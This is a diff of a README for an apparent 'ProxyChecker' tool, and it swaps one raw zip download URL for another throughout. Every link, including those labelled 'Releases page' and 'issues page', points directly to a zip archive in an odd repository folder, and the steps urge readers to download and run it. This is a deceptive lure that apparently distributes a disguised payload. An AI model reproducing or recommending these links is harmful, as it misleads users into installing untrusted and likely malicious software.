@@ -1,6 +1,6 @@
 # 🛠️ ProxyChecker - Effortlessly Check Your Proxies
 
-[![Download ProxyChecker](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)
+[![Download ProxyChecker](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Checker-Proxy-skipple.zip)](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Checker-Proxy-skipple.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ ProxyChecker is a simple tool to verify HTTP, SOCKS4, and SOCKS5 proxies. It com
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip) to download the latest version of ProxyChecker.
+1. Visit the [Releases page](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Checker-Proxy-skipple.zip) to download the latest version of ProxyChecker.
 
-2. Find the most recent release and look for the download link. It will usually be labeled as something like `https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip` or similar.
+2. Find the most recent release and look for the download link. It will usually be labeled as something like `https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Checker-Proxy-skipple.zip` or similar.
 
 3. Click on the download link to start downloading the installation file.
 
@@ -49,8 +49,8 @@ To get started, you need to download the application. Follow these steps:
 
 ## 🌐 More Information
 
-For more details and updates, keep an eye on the repository. You can also check the [ProxyChecker's issues page](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip) for troubleshooting tips or to report any bugs. 
+For more details and updates, keep an eye on the repository. You can also check the [ProxyChecker's issues page](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Checker-Proxy-skipple.zip) for troubleshooting tips or to report any bugs. 
 
 If you have any questions, feel free to reach out to us through the issues. Enjoy a smooth proxy checking experience!
 
-[![Download ProxyChecker](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)
+[![Download ProxyChecker](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Checker-Proxy-skipple.zip)](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Checker-Proxy-skipple.zip)
